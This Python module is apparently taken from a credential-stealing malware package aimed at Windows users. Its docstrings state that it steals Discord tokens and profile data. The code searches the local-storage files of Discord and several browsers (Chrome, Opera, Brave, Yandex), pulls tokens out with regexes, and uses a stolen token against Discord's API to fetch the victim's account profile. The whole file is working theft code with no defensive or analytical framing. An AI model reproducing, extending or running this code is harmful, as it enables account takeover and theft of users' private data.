import typing
import re
import os
import requests
from . import fs


def discord_api_call(method: str, params: typing.Dict, func, data, token: str) -> typing.Any:
    """ Calls Discord API. """

    return func(
        f"https://discord.com/api/{method}",
        params=params,
        headers={
            "Authorization": f"{token}",
            "Content-Type": "application/json"
        },
        data=data
    )


def discord_get_tokens() -> typing.List[str]:
    """ Steals all discord tokens. """

    appdata_roaming = os.getenv("APPDATA", "")
    appdata_local = os.getenv("LOCALAPPDATA", "")

    paths: typing.List[str] = [
        appdata_roaming + "\\Discord\\Local Storage\\leveldb",
        appdata_roaming + "\\discordcanary\\Local Storage\\leveldb",
        appdata_roaming + "\\discordptb\\Local Storage\\leveldb",
        appdata_roaming + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        appdata_local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
    ]

    tokens: typing.List[str] = []

    for token_path in (path for path in paths if os.path.exists(path)):
        for log_file in (file for file in fs.try_listdir(token_path) if
                         file.endswith(".log") or file.endswith(".ldb")):
            with open(f"{token_path}\\{log_file}", errors="ignore") as file:
                for line in [line.strip() for line in file.readlines() if line.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            if "mfa." in token:
                                tokens.append(token)

    return list(set(tokens))


def discord_request_profile(tokens: typing.List[str] = None) -> typing.Optional[typing.Dict]:
    """ Steals all discord profile information. """

    if tokens is None:
        tokens = discord_get_tokens()

    if not tokens:
        return None

    api_response: requests.Response = discord_api_call("users/@me", {}, requests.get, None, tokens[0])
    return api_response.json()
